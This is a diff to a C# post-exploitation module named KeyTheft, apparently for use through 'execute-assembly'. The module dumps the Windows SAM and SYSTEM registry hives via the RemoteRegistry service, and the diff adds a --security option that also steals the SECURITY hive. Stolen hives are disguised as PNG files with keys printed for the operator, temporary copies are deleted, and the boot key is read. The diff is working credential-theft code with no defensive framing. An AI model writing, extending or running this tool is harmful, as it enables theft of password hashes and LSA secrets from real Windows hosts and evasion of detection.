@@ -583,7 +583,7 @@ public static class KeyTheft
     static void Usage()
     {
         Console.Error.WriteLine("KeyTheft C# module (execute-assembly / standalone)");
-        Console.Error.WriteLine("  KeyTheft [--sam <path>] [--system <path>] [--pack png|none] [--keep-temp] [--quiet]");
+        Console.Error.WriteLine("  KeyTheft [--sam <path>] [--system <path>] [--security <path>] [--pack png|none] [--keep-temp] [--quiet]");
         Console.Error.WriteLine("  exit 0 = both hives, 2 = partial, 1 = failure, 3 = bad args");
     }
 
@@ -604,6 +604,8 @@ public static class KeyTheft
     {
         string samOut = "sam.png";
         string sysOut = "system.png";
+        string secOut = "security.png";
+        bool secWanted = false;
         bool pack = true;
         bool keepTemp = false;
         for (int i = 0; i < args.Length; i++)
@@ -613,6 +615,11 @@ public static class KeyTheft
                 samOut = args[++i];
             else if (a == "--system" && i + 1 < args.Length)
                 sysOut = args[++i];
+            else if (a == "--security" && i + 1 < args.Length)
+            {
+                secOut = args[++i];
+                secWanted = true;
+            }
             else if (a == "--pack" && i + 1 < args.Length && args[i + 1] == "none")
             {
                 pack = false;
@@ -649,8 +656,10 @@ public static class KeyTheft
 
         string samTmp = samOut + ".tmp";
         string sysTmp = sysOut + ".tmp";
+        string secTmp = secOut + ".tmp";
         bool samOk = false;
         bool sysOk = false;
+        bool secOk = false;
 
         ServiceState svc = AcquireService("RemoteRegistry");
         if (svc.Pid != 0)
@@ -670,6 +679,21 @@ public static class KeyTheft
                 else
                 {
                     Log("  [-] remote SAM open failed");
+                }
+                if (secWanted)
+                {
+                    IntPtr hSec;
+                    if (RegOpenKeyExW(hRemote, "SECURITY", 4, KeyRead, out hSec) == 0)
+                    {
+                        secOk = StealAndSave(svc.Pid, typeIdx, "\\REGISTRY\\MACHINE\\SECURITY", secTmp);
+                        RegCloseKey(hSec);
+                        if (secOk)
+                            Art("wrote " + secTmp);
+                    }
+                    else
+                    {
+                        Log("  [-] remote SECURITY open failed: " + Marshal.GetLastWin32Error());
+                    }
                 }
                 RegCloseKey(hRemote);
             }
@@ -716,12 +740,27 @@ public static class KeyTheft
                 File.Move(sysTmp, sysOut);
             }
         }
+        string secKey = null;
+        if (secWanted && secOk)
+        {
+            if (pack)
+            {
+                secKey = PackPng(secTmp, secOut);
+                Art("packed " + secOut + " key in operator output");
+            }
+            else
+            {
+                File.Move(secTmp, secOut);
+            }
+        }
         if (!keepTemp)
         {
             if (File.Exists(samTmp) && samTmp != samOut)
                 File.Delete(samTmp);
             if (File.Exists(sysTmp) && sysTmp != sysOut)
                 File.Delete(sysTmp);
+            if (File.Exists(secTmp) && secTmp != secOut)
+                File.Delete(secTmp);
         }
 
         string bk = BootKey();
@@ -731,14 +770,20 @@ public static class KeyTheft
         Console.WriteLine("");
         Console.WriteLine("SAM:    " + (samOk ? "SUCCESS" : "FAILED"));
         Console.WriteLine("SYSTEM: " + (sysOk ? "SUCCESS" : "FAILED"));
+        if (secWanted)
+            Console.WriteLine("SECURITY: " + (secOk ? "SUCCESS" : "FAILED"));
         if (pack && samKey != null)
             Console.WriteLine("sam key: " + samKey);
         if (pack && sysKey != null)
             Console.WriteLine("system key: " + sysKey);
+        if (pack && secWanted && secKey != null)
+            Console.WriteLine("security key: " + secKey);
         Log("");
         Log("decode with decode.py <keyhex> <file>");
         foreach (string a in Ledger)
             Log("[ledger] " + a);
-        return samOk && sysOk ? 0 : (samOk || sysOk ? 2 : 1);
+        bool allOk = samOk && sysOk && (!secWanted || secOk);
+        bool anyOk = samOk || sysOk || (secWanted && secOk);
+        return allOk ? 0 : (anyOk ? 2 : 1);
     }
 }
